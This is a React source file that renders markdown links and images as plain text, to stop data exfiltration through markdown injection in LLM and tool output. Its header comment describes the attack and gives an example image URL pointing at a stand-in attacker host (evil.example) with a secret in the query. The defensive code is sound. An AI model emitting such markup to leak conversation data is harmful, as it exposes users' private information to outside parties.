import { isValidElement, type ReactNode } from "react";
import type { Components } from "react-markdown";
import styles from "./MarkdownRenderer.module.css";

/**
 * Markdown link/image policy (issue #228: markdown injection).
 *
 * Links and images in LLM output, tool output, document content or shared
 * assistant metadata can exfiltrate conversation data: a rendered
 * `![](https://evil.example/?d=secret)` makes the browser send a request to
 * the attacker as soon as it is displayed, and clicking a link can leak the
 * same way. None of these surfaces can be trusted, so markdown links and
 * images render as plain text everywhere: no `<a>` element is created, no
 * `<img>` is ever fetched, the URL stays visible as text.
 */
interface SafeLinkProps {
    href?: string;
    children?: ReactNode;
}

interface SafeImageProps {
    alt?: string;
    src?: string;
    title?: string;
}

const flattenText = (node: ReactNode): string => {
    if (node === null || node === undefined || typeof node === "boolean") return "";
    if (typeof node === "string" || typeof node === "number") return String(node);
    if (Array.isArray(node)) return node.map(flattenText).join("");
    if (isValidElement(node)) return flattenText((node.props as { children?: ReactNode }).children);
    return "";
};

export const SafeMarkdownLink = ({ href, children }: SafeLinkProps) => {
    const url = (href ?? "").trim();
    if (!url) return <>{children}</>;
    const text = flattenText(children);
    if (text.includes(url)) return <>{children}</>;
    return (
        <>
            {children}
            <span className={styles.linkUrl}> ({url})</span>
        </>
    );
};

export const SafeMarkdownImage = ({ alt, src, title }: SafeImageProps) => {
    const text = (alt ?? "").trim() || (title ?? "").trim() || (src ?? "").trim();
    return text ? <span className={styles.linkUrl}>{text}</span> : null;
};

export const safeMarkdownComponents: Components = {
    a: SafeMarkdownLink,
    img: SafeMarkdownImage
};

/** Merge the safe link/image policy with local component overrides. */
export const withSafeMarkdownLinks = (components: Components = {}): Components => ({
    ...safeMarkdownComponents,
    ...components
});

const SPLIT_WITH_FENCES = /(```[\s\S]*?(?:```|$)|~~~[\s\S]*?(?:~~~|$)|`[^`\n]*`)/g;

const stripLinks = (markdown: string): string =>
    markdown
        // images ![alt](url) -> alt
        .replace(/!\[([^\]]*)\]\(([^)]*)\)/g, "$1")
        // inline links [text](url) -> text
        .replace(/\[([^\]]*)\]\(([^)]*)\)/g, "$1")
        // reference links [text][ref] -> text
        .replace(/\[([^\]]+)\]\[[^\]]*\]/g, "$1")
        // autolinks <https://example.com> -> https://example.com
        .replace(/<((?:https?|mailto|xmpp):[^>\s]+)>/g, "$1")
        // link definitions [ref]: url
        .replace(/^\s*\[[^\]]+\]:\s*\S+.*$/gm, "");

/**
 * Neutralize markdown link/image syntax in a plain-text context (e.g. before
 * rendering a mindmap), keeping fenced and inline code untouched.
 */
export const stripMarkdownLinks = (markdown: string): string =>
    markdown
        .split(SPLIT_WITH_FENCES)
        .map((part, index) => (index % 2 === 1 ? part : stripLinks(part)))
        .join("");
